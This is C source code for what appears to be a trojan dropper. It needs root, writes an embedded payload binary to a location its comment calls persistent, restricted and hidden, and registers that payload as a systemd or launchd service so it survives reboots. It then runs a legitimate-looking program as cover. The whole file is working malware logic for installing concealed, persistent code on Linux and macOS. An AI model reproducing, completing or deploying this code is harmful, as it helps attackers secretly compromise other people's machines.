#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <stdlib.h>
#include <errno.h>

#include "payload_info.h"
#include "legit.h"
#include "util.h"

int copy_payload()
{
	unsigned int buffer_size = 1024;
	unsigned int written = 0;
	int fd = open(DEST_PATH, O_WRONLY | O_CREAT | O_TRUNC);
	if (fd < 0)
	{
		printf("copy_payload: failed to create new file: %d\n", errno);
		return 1;
	}

    while (written < PAYLOAD_LEN)
    {
        int n = write(fd,
                      PAYLOAD_BYTES + written,
                      (PAYLOAD_LEN - written > buffer_size)
                          ? buffer_size
                          : (PAYLOAD_LEN - written));

        if (n <= 0)
        {
            perror("copy_payload: write failed");
            close(fd);
            return 1;
        }

        written += n;
    }

    close(fd);
    return 0;
}

int create_and_start_service()
{
	#ifdef __linux__

		// if service is up, do nothing
		if (!check_running_linux())
			return 0;
		
		// if service does not exist, create the service
		if (check_service_linux())
		{
			if (create_service_linux())	
				return 1;
		}

		// start the service
		return start_service_linux();
	

	#elif __APPLE__
		// if service is up, do nothing
		if (!check_running_apple())
			return 0;
		
		// if service does not exist, create the service
		if (check_service_apple())
		{
			if (create_service_apple())	
				return 1;
		}

		// start the service
		return start_service_apple();

		
	#else
		printf("create_service: unsupported OS\n");
		return 1;
	#endif

}

int main()
{
	// check sudo
	if (geteuid() != 0) {
		printf("program must be run in sudo\n");
		return 1;
    }
	

	// copy the binary in the place where it is persistent, restricted and hidden
	if (copy_payload())
		return 1;

	// launch the daemon, also make it launch on startup, systemd on linux and launchd for apple
	if(create_and_start_service())
		return 1;

	// run legit
	run_legit(PAYLOAD_BYTES, PAYLOAD_LEN);

	return 0;
}
